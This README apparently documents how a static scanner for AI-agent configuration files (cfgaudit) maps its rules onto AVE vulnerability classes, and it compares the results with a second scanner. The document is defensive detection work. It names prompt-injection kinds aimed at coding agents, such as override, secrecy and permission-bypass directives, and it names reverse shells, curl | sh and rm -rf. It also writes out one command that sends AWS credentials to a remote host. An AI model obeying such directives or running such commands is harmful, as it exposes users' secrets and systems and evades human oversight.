# cfgaudit → AVE crosswalk

[cfgaudit](https://github.com/cfgaudit/cfgaudit) is a static auditor of committable AI-agent **configuration files** (Claude Code `settings.json` / `CLAUDE.md` / `.mcp.json` / hooks / plugins, and the cross-agent equivalents: Cursor, Copilot, Gemini, Codex, Devin, Zed, Continue). It does not connect to running servers or observe runtime, so it maps only to AVE's `static_detection` records.

cfgaudit emits each rule's primary AVE id in its JSON and SARIF output (`AVEID` in JSON; `properties.ave_id` in SARIF). This crosswalk is the source of truth that mapping is kept in sync with. Full write-up: [`docs/cfgaudit-to-ave.md`](https://github.com/cfgaudit/cfgaudit/blob/main/docs/cfgaudit-to-ave.md).

## Versions

| | Version |
|---|---|
| cfgaudit | 1.9.0 |
| AVE record set | 1.1.0 |
| Bawbel Scanner (validation, below) | 1.3.0 |

## Coverage

cfgaudit has **90 rules** in total. **33 of them map onto 19 AVE behavioral classes.** It is a many-to-one mapping: several cfgaudit rules land on the same AVE class, because cfgaudit slices threats by config surface where AVE slices by behavior. For example, cfgaudit has five distinct secret-detection rules (a secret in `settings.json` env, in an MCP `env`/`headers` block, an entropy fallback, a Continue inline `apiKey`, a crypto signing key), and all five map to the single AVE class `AVE-2026-00047` (hardcoded credentials in component).

The other 57 rules have no AVE class: they check config surfaces AVE's skill and MCP-server records do not enumerate (see "Config surfaces beyond AVE's model" below).

## Rule mapping

| cfgaudit rule(s) | AVE id | Class | Notes |
|---|---|---|---|
| CFG024 | AVE-2026-00029 | homoglyph / Unicode obfuscation | hidden Unicode control chars in instruction text |
| CFG026 | AVE-2026-00007 | goal hijack | override / persona / authority instruction |
| CFG029 | AVE-2026-00021 | autonomous action without confirmation | instruction to bypass permission prompts |
| CFG030 | AVE-2026-00010 | covert instruction concealment | "don't tell the user" / secrecy directive |
| CFG032 | AVE-2026-00025 | conversation-history / role injection | pseudo-system tags, turn-boundary injection |
| CFG035 | AVE-2026-00011 | dynamic tool-call injection | instruction to configure or trust an MCP server |
| CFG031, CFG036, CFG037, CFG038 | AVE-2026-00003 | credential exfiltration | sensitive-path read, env dump, embedded exfil shell |
| CFG033, CFG072 | AVE-2026-00039 | covert-channel exfiltration | markdown-image sink, DNS-name exfil |
| CFG056 | AVE-2026-00058 | deceptive trigger / activation-scope | broad always-on skill trigger |
| CFG057 | AVE-2026-00057 | obfuscated / encoded payload | base64 or data-URI encoded injection |
| CFG081 | AVE-2026-00027 | multi-turn instruction persistence | "survive context compaction" directive |
| CFG051, CFG085 | AVE-2026-00048 | unsafe agent delegation chain | over-broad tool grant in agent frontmatter |
| CFG090 | AVE-2026-00032 | network reconnaissance instruction | scan or enumerate an internal network (see gaps re: precision) |
| CFG008, CFG014 | AVE-2026-00004 | shell-pipe code execution | reverse shell, `curl \| sh` |
| CFG039 | AVE-2026-00005 | recursive filesystem destruction | `rm -rf` |
| CFG027, CFG028 | AVE-2026-00008 | persistence / self-replication | cron/startup persistence, writing trust files |
| CFG007, CFG050, CFG054, CFG065, CFG073 | AVE-2026-00047 | hardcoded credentials in component | secrets in settings or MCP env/headers |
| CFG052, CFG059 | AVE-2026-00017 | server impersonation / spoofing | MCP name shadowing, typosquat |
| CFG019, CFG020, CFG070 | AVE-2026-00055 | command exec via untrusted MCP launch config | inline-script, env-code, repo-relative launcher |

Mappings are class-level behavioral equivalence, not asserted identity. Where a cfgaudit rule covers more than one AVE class, only the canonical primary is emitted (matching AVE's one-`ruleId`-per-class SARIF model); the full multi-mapping is in cfgaudit's own crosswalk doc.

## Config surfaces beyond AVE's model

AVE's records enumerate behavior in skills and MCP servers. cfgaudit additionally audits config-file classes that carry no corresponding AVE behavioral class today. The 57 unmapped rules cluster into these surfaces:

| Config surface | Example files / keys | Example rules |
|---|---|---|
| Permission / approval config | `permissions.allow`, `defaultMode: bypassPermissions`, `enableAllProjectMcpServers`, `.vscode` `chat.tools.autoApprove` | CFG001, CFG003, CFG004, CFG048, CFG079 |
| Zero-click IDE / workspace auto-run | `.vscode/tasks.json` `runOn: folderOpen`, committed `.claude`/Cursor/Copilot hooks | CFG047, CFG067, CFG086, CFG087 |
| Telemetry / endpoint redirect | `OTEL_EXPORTER_OTLP_*`, `ANTHROPIC_BASE_URL`, model `base_url` | CFG005, CFG046, CFG071 |
| Sandbox weakening in config | `sandbox` excludes/paths, Gemini/Codex sandbox modes | CFG022, CFG061, CFG064 |
| TLS verification disabled | `NODE_TLS_REJECT_UNAUTHORIZED=0`, `GIT_SSL_NO_VERIFY`, `--insecure` in MCP `env`/`args` | CFG075 |
| Container / daemon posture | `DOCKER_HOST` off-host, `DOCKER_CONTENT_TRUST=0`, Chromium launcher args | CFG082, CFG083, CFG084 |
| MCP network / transport posture | bind-all `0.0.0.0`, wildcard CORS, deprecated `sse`, proxy env, log redaction | CFG018, CFG066, CFG058, CFG021, CFG069 |
| Supply-chain pinning / plugin auto-install | unpinned MCP package, `enabledPlugins`/`extraKnownMarketplaces`, `skills-lock.json` | CFG010, CFG055, CFG074, CFG089 |

These are not gaps in this crosswalk; they are config classes outside AVE's current skill/MCP-behavioral scope. They are listed here so the taxonomy's coverage against a config-auditor is visible.

## Cross-implementation validation (cfgaudit vs Bawbel Scanner)

To test whether the shared ids actually interoperate, cfgaudit **1.9.0** and [Bawbel Scanner](https://github.com/bawbel/scanner) **1.3.0**, which share no code and no ruleset and only the AVE taxonomy, were run on the same `SKILL.md` files using cfgaudit's canonical trigger text unmodified (not tuned for agreement). Static engines only (`pattern`+`yara`+`semgrep`, no LLM), both reading `ave_id` from JSON.

Of cfgaudit's 33 AVE-mapped rules, **10 instruction/skill-content rules share a scan surface with Bawbel's file scan** (the other 23 read command sites or config files Bawbel's file scan does not cover). Of those 10:

**Both scanners independently emit the same `ave_id` on 5 of the 10.**

| Rule | AVE | cfgaudit | Bawbel | |
|---|---|---|---|---|
| CFG024 | 00029 | yes | yes | agree |
| CFG026 | 00007 | yes | yes (+00002) | agree |
| CFG029 | 00021 | yes | yes | agree |
| CFG030 | 00010 | yes | yes (+00003) | agree |
| CFG090 | 00032 | yes | yes | agree |
| CFG031 | 00003 | yes | no | detection differs |
| CFG035 | 00011 | yes | no | detection differs |
| CFG036 | 00003 | yes | no | detection differs |
| CFG057 | 00057 | yes | no | detection differs |
| CFG081 | 00027 | yes | no | detection differs |

The 5 agreements are cross-implementation corroboration of the mapping. The 5 divergences are detection-pattern differences, not mapping errors: Bawbel bundles a rule for each class, but its pattern did not match cfgaudit's canonical trigger. For CFG036, for instance, Bawbel reports the `curl …?d=$(cat ~/.aws/credentials)` skill CLEAN while cfgaudit flags it. A shared id makes exactly these coverage differences visible and comparable, which is the point.

## Gaps

Static `static_detection` classes cfgaudit does not map, with the reason:

| AVE id | Gap |
|---|---|
| AVE-2026-00015 | system-prompt extraction. Maps to OWASP LLM07, which cfgaudit treats as runtime; the instruction is static, but the scope boundary is undecided. |
| AVE-2026-00036 | lateral movement. cfgaudit implemented and then reverted this rule after a false-positive analysis over 422 real instruction files: the vocabulary (`lateral movement`, `pivot to other systems`) is statically indistinguishable from security-tool self-description and defensive contexts. |
| AVE-2026-00059 | fragmented cross-description injection. Needs multi-source correlation; cfgaudit checks each file in isolation, which is the exact property this attack defeats. |
